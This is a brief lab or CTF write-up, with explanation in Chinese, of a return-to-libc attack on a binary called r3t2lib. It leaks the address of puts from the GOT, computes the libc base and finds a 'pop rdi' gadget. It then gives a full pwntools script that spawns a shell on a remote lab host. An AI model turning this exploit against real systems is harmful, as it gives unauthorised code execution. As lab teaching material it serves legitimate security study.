## Lab 3
此題利用題目提供的功能leak出`.got`中libc function的位置，在以該位置算出libc相對ofsset來造成return to libc attack，先找出`puts`在`.got`的位置
```
$ objdump -R r3t2lib | grep puts
0000000000601018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
```
接著找出`puts`, `system`, `"/bin/sh"`在libc中的offset
```
$ objdump -T libc.so.6 | grep puts
$ objdump -T libc.so.6 | grep system
$ strings -tx libc.so.6 | grep /bin/sh
```
最後再找到一個寫入rdi的gadget
```
$ ROPgadget --binary r3t2lib | grep "pop rdi"
```

### exploit
```python
#!/usr/bin/env python3
from pwn import *
import re

context.update(os='linux', arch='amd64')
libc = ELF("libc.so.6")
binary = ELF("r3t2lib")
puts_got = binary.got[b'puts']

r = remote('pwnhub.tw', 8088)
r.sendline(format(puts_got, 'x'))
puts_addr = r.recvline_contains("0x")
puts_addr = int(re.search(b'0x[0-9A-Fa-f]+', puts_addr).group(0), 16)

puts_offset = libc.symbols[b'puts']
libc_base = puts_addr - puts_offset
system_offset = libc.symbols[b'system']
sh_offset = next(libc.search("/bin/sh\x00"))

payload = cyclic(280).encode()
payload += p64(ROP(binary).rdi.address) # jmp to rdi gadget
payload += p64(libc_base + sh_offset) # rdi = "/bin/sh"
payload += p64(libc_base + system_offset) # system

r.sendline(payload)
r.interactive()
```
